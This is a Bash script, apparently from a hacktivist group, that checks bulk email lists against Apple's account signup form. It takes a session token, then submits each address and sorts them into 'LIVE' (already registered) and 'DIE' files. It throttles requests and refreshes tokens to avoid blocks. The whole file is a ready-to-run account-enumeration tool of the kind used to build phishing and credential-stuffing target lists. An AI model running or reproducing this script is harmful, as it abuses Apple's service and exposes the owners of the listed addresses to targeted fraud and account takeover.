#!/bin/bash
# Clown Hacktivism Team
# AppleID Valid
# 30a December
# By X-Mr.R4h1M

#set -x
cat <<EOF
            - VALIDATOR PayPal -
           [+]ad.android@yahoo.com[+]
     [+]www.facebook.com/my.profile.co.id[+]
        
===================================================
   Email PayPal Validator By : X-Mr.R4h1M
===================================================
EOF

usage() { 
  echo "Usage: ./myscript.sh COMMANDS: [-i <list.txt>] [-r <folder/>] [-l {1-1000}] [-t {1-10}] OPTIONS: [-d] [-c]

Command:
-i (20k-US.txt)     File input that contain email to check
-r (result/)        Folder to store the result live.txt and die.txt
-l (60|90|110)      How many list you want to send per delayTime
-t (3|5|8)          Sleep for -t when check is reach -l fold

Options:
-d                  Delete the list from input file per check
-c                  Compress result to compressed/ folder and
                    move result folder to haschecked/
-h                  Show this manual to screen
-u                  Check integrity file then update

Report any bugs to: <X-Mr.R4h1M> ad.android@yahoo.com
"
  exit 1 
}

# Assign the arguments for each
# parameter to global variable
while getopts ":i:r:l:t:dchu" o; do
    case "${o}" in
        i)
            inputFile=${OPTARG}
            ;;
        r)
            targetFolder=${OPTARG}
            ;;
        l)
            sendList=${OPTARG}
            ;;
        t)
            perSec=${OPTARG}
            ;;
        d)
            isDel='y'
            ;;
        c)
            isCompress='y'
            ;;
        h)
            usage
            ;;
    esac
done

# Do automatic update
# before passing arguments

if [[ $inputFile == '' || $targetFolder == '' || $sendList == '' || $perSec == '' ]]; then
  cli_mode="interactive"
else
  cli_mode="interpreter"
fi

# Assign false value boolean
# to both options when its null
if [ -z "${isDel}" ]; then
  isDel='n'
fi

if [ -z "${isCompress}" ]; then
  isCompress='n'
fi

SECONDS=0

# Asking user whenever the
# parameter is blank or null
if [[ $inputFile == '' ]]; then
  # Print available file on
  # current folder
  # clear
  read -p "Enter mailist file: " inputFile
fi

if [[ $targetFolder == '' ]]; then
  read -p "Enter target folder: " targetFolder
  # Check if result folder exists
  # then create if it didn't
  if [[ ! -d "$targetFolder" ]]; then
    echo "[+] Creating $targetFolder/ folder"
    mkdir $targetFolder
  else
    read -p "$targetFolder/ folder are exists, append to them ? [y/n]: " isAppend
    if [[ $isAppend == 'n' ]]; then
      exit
    fi
  fi
else
  if [[ ! -d "$targetFolder" ]]; then
    echo "[+] Creating $targetFolder/ folder"
    mkdir $targetFolder
  fi
fi

if [[ $isDel == '' || $cli_mode == 'interactive' ]]; then
  read -p "Delete list per check ? [y/n]: " isDel
fi

if [[ $isCompress == '' || $cli_mode == 'interactive' ]]; then
  read -p "Compress the result ? [y/n]: " isCompress
fi

if [[ $sendList == '' ]]; then
  read -p "How many list send: " sendList
fi

if [[ $perSec == '' ]]; then
  read -p "Delay time: " perSec
fi

rahim_appleval() {
  emailAddress="$1"
  SECONDS=0  
  check=`curl 'https://ams.apple.com/pages/SignUp.jsf' -H 'Cookie: JSESSIONID='$JSESSIONID' ' -H 'Origin: https://ams.apple.com' -H 'Accept-Encoding: gzip, deflate, br' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' --data 'SignUpForm=SignUpForm&SignUpForm%3AemailField='$emailAddress'&SignUpForm%3AblueCenter=Continue&javax.faces.ViewState=j_id1' --compressed -D - -s -b cookies.txt -c null.txt`

  duration=$SECONDS
  header="${PUR}`date +%H:%M:%S`${NC} from ${CYAN}$inputFile${NC} to ${ORANGE}$targetFolder${NC}"
  footer="[Slackercode - AppleValid V3] $(($duration % 60))sec.\n"

  val="$(echo "$check" | grep -c 'already registered')"
  inv="$(echo "$check" | grep -c 'Enter the name of your company')"
  enc="$(echo "$check" | grep -c 'We encourage you to use your business email address')"
  dom="$(echo "$check" | grep -c 'Sorry, this email address')"
  exp="$(echo "$check" | grep -c 'Your session might have expired')"

  if [[ $val > 0 ]]; then
    printf "[$header] $2/$3. ${ORANGE}LIVE => $1 ${NC} $footer"
    echo "LIVE => $1" >> $4/live.txt
  else
    if [[ $inv > 0 || $dom > 0 || $enc > 0 ]]; then
      printf "[$header] $2/$3. ${RED}DIE => $1 ${NC} $footer"
      echo "DIE => $1" >> $4/die.txt
    else
      if [[ $exp > 0 ]]; then
        printf "[$header] $2/$3. ${CYAN}EXPIRED => $1 ${NC} $footer"
        echo "$1 => $check" >> reason.txt
        echo "EXPIRED => $1" >> $inputFile
        touch exp.txt
      else
        printf "[$header] $2/$3. ${CYAN}UNKNOWN => $1 ${NC} $footer"
        echo "$1 => $check" >> reason.txt
        echo "UNKNOWN => $1" >> $inputFile
      fi
    fi
  fi

  printf "\r"
}

if [[ ! -f $inputFile ]]; then
  echo "[404] File mailist not found. Check your mailist file name."
  ls -l
  exit
fi

# Preparing file list 
# by using email pattern 
# every line in $inputFile
echo "[+] Cleaning your mailist file"
grep -Eiorh '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\.[[:alpha:].]{2,6})' $inputFile | tr '[:upper:]' '[:lower:]' | sort | uniq > temp_list && mv temp_list $inputFile

# Finding match mail provider
echo "########################################"
# Print total line of mailist
totalLines=`grep -c "@" $inputFile`
echo "There are $totalLines of list."
echo " "
echo "Hotmail: `grep -c "@hotmail" $inputFile`"
echo "Yahoo: `grep -c "@yahoo" $inputFile`"
echo "Gmail: `grep -c "@gmail" $inputFile`"
echo "########################################"

# Extract email per line
# from both input file
IFS=$'\r\n' GLOBIGNORE='*' command eval  'mailist=($(cat $inputFile))'
con=1

getKey() {
  JSESSIONID=`curl "https://ams.apple.com/" -D - -s | grep "JSESSIONID" | awk -F[=\;] '{print $2}' | xargs`
  if [[ $JSESSIONID == '' ]]; then
    echo "Failed to generate token. Try again later."
    exit
  fi
  rm -f exp.txt
}
getKey

echo "[+] Sending $sendList email per $perSec seconds"

for (( i = 0; i < "${#mailist[@]}"; i++ )); do
  username="${mailist[$i]}"
  indexer=$((con++))
  tot=$((totalLines--))

  fold=`expr $i % $sendList`
  if [[ $fold == 0 && $i > 0 ]]; then
    header="`date +%H:%M:%S`"
    duration=$SECONDS
    printf "Waiting $perSec seconds. $(($duration / 3600)) hours $(($duration / 60 % 60)) minutes and $(($duration % 60)) seconds elapsed, ratio ${YELLOW}$sendList email${NC} / ${CYAN}$perSec seconds${NC}\n"
    sleep $perSec
  fi

  if [[ -f exp.txt ]]; then
    echo "waiting. generating new token"
    sleep 4
    getKey
    echo "Token generated: $JSESSIONID"
    sleep 2
  fi
  
  rahim_appleval "$username" "$indexer" "$tot" "$targetFolder" "$inputFile" &

  if [[ $isDel == 'y' ]]; then
    grep -v -- "$username" $inputFile > "$inputFile"_temp && mv "$inputFile"_temp $inputFile
  fi
done 

# waiting the background process to be done
# then checking list from garbage collector
# located on $targetFolder/unknown.txt
echo "[+] Waiting background process to be done"
wait
wc -l $targetFolder/*

if [[ $isCompress == 'y' ]]; then
  tgl=`date`
  tgl=${tgl// /-}
  zipped="$targetFolder-$tgl.zip"

  echo "[+] Compressing result"
  zip -r "compressed/$zipped" "$targetFolder/die.txt" "$targetFolder/live.txt"
  echo "[+] Saved to compressed/$zipped"
  mv $targetFolder haschecked
  echo "[+] $targetFolder has been moved to haschecked/"
fi
#rm $inputFile
duration=$SECONDS
echo "$(($duration / 3600)) hours $(($duration / 60 % 60)) minutes and $(($duration % 60)) seconds elapsed."
echo "+==========+ PivateNew - AppleValid V3 - X-Mr.R4h1M +==========+"
